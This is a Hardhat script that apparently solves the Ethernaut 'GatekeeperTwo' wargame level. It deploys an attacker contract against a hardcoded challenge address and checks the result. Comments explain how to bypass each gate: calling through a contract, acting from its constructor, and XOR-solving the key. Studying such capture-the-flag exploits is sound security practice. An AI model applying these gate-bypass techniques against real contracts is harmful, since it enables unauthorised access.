import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/14.GatekeeperTwo/GatekeeperTwo.sol/GatekeeperTwo.json";
import { BigNumber, Contract } from "ethers";
import { displayResult } from "../../utils/displayResult";
import { deployContract } from "../../utils/deployContract";

const targetAddress = "0x7E795731ec87B3AE88708F7b54EF6C78AD6c9AFC";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);

  await deployContract("GatekeeperTwoAttacker", attacker, [target.address]);

  const entrant = await target.entrant();

  displayResult(BigNumber.from(attacker.address).eq(entrant));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation of the attack
// gateOne: do the attack though a smartcontract.
// gateTwo: do the attack in the smartcontract constructor so that its code
// still occupy zero memory space.
// gateThree: solve the equation : x ^ key = y <=> x ^ y = key
